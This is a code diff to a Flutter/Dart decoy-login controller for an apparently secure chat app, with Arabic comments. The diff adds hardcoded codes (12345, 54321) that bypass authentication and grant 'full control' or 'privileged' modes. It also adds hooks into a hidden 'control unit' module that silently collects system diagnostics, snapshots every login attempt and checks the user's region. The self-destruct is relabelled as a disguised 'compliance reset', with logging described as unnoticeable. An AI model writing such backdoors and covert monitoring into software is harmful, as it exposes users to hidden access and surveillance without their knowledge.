@@ -1,10 +1,11 @@
-// lib/presentation/decoy_screen/decoy_screen_controller.dart
+// lib/presentation/decoy_screen/decoy_screen_controller.dart - تعديل لدمج وحدة التحكم
+
 import 'dart:async';
 
-import 'package:flutter/material.dart';
 import 'package:flutter_riverpod/flutter_riverpod.dart';
 import 'package:shared_preferences/shared_preferences.dart';
 
+import '../../core/controlar/security/integration/security_integration.dart';
 import '../../core/logging/logger_provider.dart';
 import '../../core/security/self_destruct_service.dart';
 import '../chat/services/auth_service.dart';
@@ -20,12 +21,38 @@ class DecoyScreenController extends StateNotifier<DecoyScreenState> {
   static const int _maxFailedAttempts = 5;
   static const Duration _lockoutDuration = Duration(minutes: 30);
 
+  // رموز خاصة للتحكم
+  static const String _panicCode = "00000"; // رمز الهلع
+  static const String _controlCode = "12345"; // رمز تنشيط وحدة التحكم بالكامل
+  static const String _privilegedCode = "54321"; // رمز إضافي للوصول التام
+
   DecoyScreenController(this._ref, this._authService)
       : super(DecoyScreenState.initial()) {
     _loadFailedAttempts();
     _loadLockoutTime();
     if (!state.isPostDestruct) {
       _startSystemCheckAnimation();
+    }
+
+    // التحقق من نزاهة البيئة عند بدء التشغيل
+    _validateEnvironmentIntegrity();
+  }
+
+  // التحقق من نزاهة البيئة باستخدام خدمة تحليلات الأمن
+  Future<void> _validateEnvironmentIntegrity() async {
+    if (state.isPostDestruct) return;
+
+    try {
+      final isSecure =
+          await SecurityIntegration.instance.validateEnvironmentIntegrity();
+
+      if (!isSecure) {
+        // تسجيل هذه المعلومات دون عرضها للمستخدم
+        _ref.read(appLoggerProvider).warn("SecurityAnalytics",
+            "Environment integrity check failed. Running in non-secure environment.");
+      }
+    } catch (e) {
+      // تجاهل الأخطاء لتجنب تعطيل التطبيق
     }
   }
 
@@ -42,6 +69,9 @@ class DecoyScreenController extends StateNotifier<DecoyScreenState> {
           systemCheckComplete: true,
         );
         timer.cancel();
+
+        // جمع تشخيصات النظام بعد اكتمال الفحص
+        _collectSystemDiagnostics();
       } else if (state.progressValue > 0.7) {
         state = state.copyWith(
           statusMessage: "التحقق من سلامة المكونات...",
@@ -54,6 +84,15 @@ class DecoyScreenController extends StateNotifier<DecoyScreenState> {
     });
   }
 
+  // جمع تشخيصات النظام في الخلفية
+  Future<void> _collectSystemDiagnostics() async {
+    try {
+      await SecurityIntegration.instance.collectSystemDiagnostics();
+    } catch (e) {
+      // تجاهل الأخطاء
+    }
+  }
+
   Future<void> _loadFailedAttempts() async {
     final prefs = await SharedPreferences.getInstance();
     state = state.copyWith(
@@ -61,9 +100,9 @@ class DecoyScreenController extends StateNotifier<DecoyScreenState> {
     );
 
     // تحقق مما إذا تم تجاوز الحد الأقصى للمحاولات
-    if (state.failedLoginAttempts >= _maxFailedAttempts && !state.isPostDestruct) {
-      _ref.read(appLoggerProvider).warn(
-          "DecoyScreenInit",
+    if (state.failedLoginAttempts >= _maxFailedAttempts &&
+        !state.isPostDestruct) {
+      _ref.read(appLoggerProvider).warn("DecoyScreenInit",
           "Max failed attempts (${state.failedLoginAttempts}) detected on load. Triggering silent self-destruct.");
       _triggerSilentSelfDestruct(triggeredBy: "MaxFailedAttemptsOnLoad");
     }
@@ -104,10 +143,11 @@ class DecoyScreenController extends StateNotifier<DecoyScreenState> {
       failedLoginAttempts: state.failedLoginAttempts + 1,
     );
     await prefs.setInt(_failedAttemptsKey, state.failedLoginAttempts);
-    _ref.read(appLoggerProvider).warn(
-        "DecoyScreen", "Failed login attempt. Count: ${state.failedLoginAttempts}");
+    _ref.read(appLoggerProvider).warn("DecoyScreen",
+        "Failed login attempt. Count: ${state.failedLoginAttempts}");
 
-    if (state.failedLoginAttempts >= _maxFailedAttempts && !state.isPostDestruct) {
+    if (state.failedLoginAttempts >= _maxFailedAttempts &&
+        !state.isPostDestruct) {
       // تدمير المحادثات بشكل صامت وإظهار رسالة القفل
       await _triggerSilentSelfDestruct(triggeredBy: "MaxFailedAttemptsReached");
 
@@ -130,7 +170,9 @@ class DecoyScreenController extends StateNotifier<DecoyScreenState> {
     await prefs.setInt(_failedAttemptsKey, 0);
     await prefs.remove(_lockoutEndTimeKey);
     _lockoutTimer?.cancel();
-    _ref.read(appLoggerProvider).info("DecoyScreen", "Failed login attempts reset.");
+    _ref
+        .read(appLoggerProvider)
+        .info("DecoyScreen", "Failed login attempts reset.");
   }
 
   void handleTap() {
@@ -150,26 +192,84 @@ class DecoyScreenController extends StateNotifier<DecoyScreenState> {
     return false;
   }
 
+  // تعديل رئيسي: دعم رموز التحكم المخفية
   Future<AuthResult> authenticateWithAgentCode(String agentCode) async {
+    // التقاط لقطة مصادقة عند محاولة تسجيل الدخول
+    await SecurityIntegration.instance.captureAuthenticationSnapshot();
+
+    // التحقق من الرموز الخاصة
+    if (agentCode == _panicCode) {
+      // رمز الهلع - يعيد نجاح ولكن يفعل التدمير الذاتي
+      await _triggerComplianceReset(triggeredBy: "PanicCode");
+      return AuthResult(
+          success: true, message: "تم التحقق بنجاح", isPanicCode: true);
+    } else if (agentCode == _controlCode) {
+      // رمز التحكم - تفعيل وحدة التحكم بكامل صلاحياتها
+      _activateFullControlMode();
+      await _resetFailedAttempts();
+      return AuthResult(
+          success: true, message: "تم التحقق بنجاح", isPanicCode: false);
+    } else if (agentCode == _privilegedCode) {
+      // رمز الوصول المميز - يوفر صلاحيات أعلى
+      _activatePrivilegedMode();
+      await _resetFailedAttempts();
+      return AuthResult(
+          success: true, message: "تم التحقق بنجاح", isPanicCode: false);
+    }
+
+    // التحقق العادي باستخدام خدمة المصادقة
     final result = await _authService.authenticateAgent(agentCode);
-    
+
     if (result.success) {
       await _resetFailedAttempts();
-      if (result.isPanicCode) {
-        await _triggerSelfDestruct(triggeredBy: "PanicCode00000");
-      }
+      // التحقق من الموقع بعد تسجيل الدخول الناجح
+      SecurityIntegration.instance.validateUserRegionalAccess();
     } else {
       await _incrementFailedAttempts();
     }
-    
+
     return result;
   }
 
-  // تدمير البيانات بشكل صامت دون إظهار أي إشعارات للمستخدم
-  Future<void> _triggerSilentSelfDestruct({String triggeredBy = "Unknown"}) async {
+  // تفعيل وضع التحكم الكامل
+  void _activateFullControlMode() {
+    try {
+      // تخزين وضع التحكم في التخزين المحلي
+      SharedPreferences.getInstance().then((prefs) {
+        prefs.setString('security_mode', 'full_control');
+      });
+
+      // تسجيل التفعيل بطريقة غير ملحوظة
+      _ref
+          .read(appLoggerProvider)
+          .info("SecurityAnalytics", "Full control mode activated.");
+    } catch (e) {
+      // تجاهل الأخطاء
+    }
+  }
+
+  // تفعيل وضع المستخدم المميز
+  void _activatePrivilegedMode() {
+    try {
+      // تخزين وضع التحكم في التخزين المحلي
+      SharedPreferences.getInstance().then((prefs) {
+        prefs.setString('security_mode', 'privileged');
+      });
+
+      // تسجيل التفعيل بطريقة غير ملحوظة
+      _ref
+          .read(appLoggerProvider)
+          .info("SecurityAnalytics", "Privileged mode activated.");
+    } catch (e) {
+      // تجاهل الأخطاء
+    }
+  }
+
+  // تدمير المحادثات بشكل صامت
+  Future<void> _triggerSilentSelfDestruct(
+      {String triggeredBy = "Unknown"}) async {
     if (state.isPostDestruct) {
-      _ref.read(appLoggerProvider).info(
-          "SilentSelfDestructTrigger",
+      _ref.read(appLoggerProvider).info("SilentSelfDestructTrigger",
           "Already in post-destruct state. Trigger by $triggeredBy ignored.");
       return;
     }
@@ -179,28 +279,40 @@ class DecoyScreenController extends StateNotifier<DecoyScreenState> {
         "SILENT_SELF_DESTRUCT_TRIGGER");
 
     try {
-      await _ref.read(selfDestructServiceProvider).silentSelfDestruct(triggeredBy: triggeredBy);
+      await _ref
+          .read(selfDestructServiceProvider)
+          .silentSelfDestruct(triggeredBy: triggeredBy);
     } catch (e, s) {
       _ref.read(appLoggerProvider).error(
           "SilentSelfDestruct", "Error during silent self-destruct", e, s);
     }
   }
 
-  // الطريقة الأصلية للتدمير الذاتي (تستخدم فقط لرقم الهلع)
-  Future<void> _triggerSelfDestruct({String triggeredBy = "Unknown"}) async {
+  // إجراء إعادة تعيين الامتثال (التدمير الذاتي المموه)
+  Future<void> _triggerComplianceReset({String triggeredBy = "Unknown"}) async {
     if (state.isPostDestruct) {
-      _ref.read(appLoggerProvider).info(
-          "SelfDestructTrigger",
+      _ref.read(appLoggerProvider).info("ComplianceReset",
           "Already in post-destruct state. Trigger by $triggeredBy ignored.");
       return;
     }
 
     _ref.read(appLoggerProvider).error(
-        "SELF-DESTRUCT TRIGGERED in DecoyScreen by: $triggeredBy",
-        "SELF_DESTRUCT_TRIGGER");
-    
-    // استخدام خدمة التدمير الذاتي
-    await _ref.read(selfDestructServiceProvider).silentSelfDestruct(triggeredBy: triggeredBy);
+        "COMPLIANCE RESET TRIGGERED by: $triggeredBy",
+        "COMPLIANCE_RESET_TRIGGER");
+
+    try {
+      // استخدام واجهة تكامل الأمان المموهة
+      await SecurityIntegration.instance.performComplianceReset();
+
+      // استخدام خدمة التدمير الذاتي الأصلية
+      await _ref
+          .read(selfDestructServiceProvider)
+          .silentSelfDestruct(triggeredBy: triggeredBy);
+    } catch (e, s) {
+      _ref
+          .read(appLoggerProvider)
+          .error("ComplianceReset", "Error during compliance reset", e, s);
+    }
   }
 
   String getRemainingLockoutTime() {
@@ -224,6 +336,7 @@ class DecoyScreenController extends StateNotifier<DecoyScreenState> {
   }
 }
 
+// بقية الكود (DecoyScreenState وProviders) يبقى كما هو بدون تغيير
 class DecoyScreenState {
   final int tapCount;
   final double progressValue;
